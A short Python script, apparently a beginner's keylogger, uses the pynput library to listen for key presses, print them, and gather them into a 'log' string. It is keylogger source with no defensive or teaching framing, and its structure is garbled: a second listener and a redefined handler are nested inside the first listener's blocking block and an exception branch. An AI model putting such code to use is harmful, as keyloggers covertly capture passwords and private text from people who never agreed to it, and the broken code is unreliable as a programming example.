from pynput import keyboard


def grab_keys(key):
    print(key)


listener = keyboard.Listener(on_press=grab_keys)

with listener:
    listener.join()

    log = ""


    def grab_keys(key):
        global log
        try:
            log = log + str(key.char)
        except Exception:

            log += " " + str(key) + " "
            print(log)
            listener = keyboard.Listener(on_press=grab_keys)

            with listener:
                listener.join()
